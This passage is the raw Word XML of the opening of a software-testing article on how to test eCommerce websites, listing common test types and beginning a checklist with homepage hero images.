          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Testing </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F97FFE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="A90000"/>
          <w:spacing w:val="-15"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>eCommerce</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F97FFE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="A90000"/>
          <w:spacing w:val="-15"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Websites</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="998" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="999" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve">E-Commerce Testing – How to Test an </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>eCommerce</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve"> Website/Application</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1000" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1001" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve">In today’s world, I bet you won’t find anyone who hasn’t shopped online. E-commerce/Retail is a business that thrives on its online customers. Shopping in person vs. shopping online has many advantages. </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>Convenience, time-saving and easy access to products worldwide, etc.</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1002" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1003" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>A good </w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "https://en.wikipedia.org/wiki/E-commerce" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="777777"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>E-commerce</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve">/Retail site is </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>key</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve"> to its success. It must be a worthy counterpart to the storefront. Because, when you go shopping at a physical store, the customer has already made a commitment to visit and might give the brand a chance. </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1004" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1005" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>Online, choices are many. So, unless there is engagement from the beginning, the user might just leave.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1006" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F97FFE">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="53007666" wp14:editId="53CB162C">
            <wp:extent cx="4622165" cy="2435860"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="88" name="Picture 88" descr="How to Test an eCommer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Test an eCommerce Websi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22165" cy="2435860"/>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007" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="1008" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>The better the site, the better the business.</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1009" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1010" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>Since so much lays on the application, it is critical that it undergoes thorough testing.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1011" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1012" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>E-commerce application/sites are web applications or mobile application too. So, they undergo all the </w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>typical test types.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="169"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1013" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1014" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Functional Testing</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="169"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1015" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1016" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Usability Testing</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="169"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1017" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1018" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Security Testing</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="169"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1019" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1020" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Performance Testing</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="169"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1021" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1022" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Database Testing</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="169"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1023" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1024" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>Mobile Application Testing</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="169"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1025" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1026" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>A/B testing.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1027" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1028" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>For a quick look at most often performed tests on a typical web application, check out</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:br/>
          <w:t>=&gt; </w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.softwaretestinghelp.com/sample-test-cases-testing-web-desktop-applications/" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="777777"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>180+ Sample Test Cases for Testing Web and Desktop Applications</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1029" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1030" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>However, Retail sites are highly dynamic in nature. There are new offers, new products, new bestsellers, Sales, etc. This means the site doesn’t stay the same for too long. Therefore, it could get overwhelming for many.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1031" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1032" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>The trick is to divide and conquer.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1033" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1034" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve">Let’s see with examples how to test and </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>eCommerce</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve"> Site:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="toctitle"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F9F9F9"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="1035" w:author="Unknown"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1036" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>What You Will Learn: </w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="toctoggle"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="toctoggle"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="toctoggle"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.softwaretestinghelp.com/ecommerce-testing/" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="toctoggle"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="777777"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>show</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="toctoggle"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="toctoggle"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>]</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="267" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1037" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1038" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>E-Commerce Testing Checklist</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1039" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1040" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve">Below, we have listed important segments and test cases for </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>eCommerce</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve"> website testing.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="267" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1041" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1042" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="FF6600"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>#1) Homepage – Hero Image:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1043" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1044" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>Homepages of retail sites are busy. They have a lot going on. But almost all of them have a Hero Image:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
